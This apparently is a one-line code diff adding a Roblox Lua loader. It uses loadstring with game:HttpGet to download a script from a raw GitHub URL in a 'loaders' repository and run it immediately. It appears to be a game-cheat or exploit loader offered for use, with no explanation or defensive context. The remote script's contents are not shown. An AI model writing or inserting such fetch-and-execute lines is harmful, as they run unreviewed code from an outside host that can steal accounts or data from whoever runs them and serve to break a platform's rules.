@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/helmets-scooter-empire-spam7-u9boi8d7l6gk8w.lua"))()
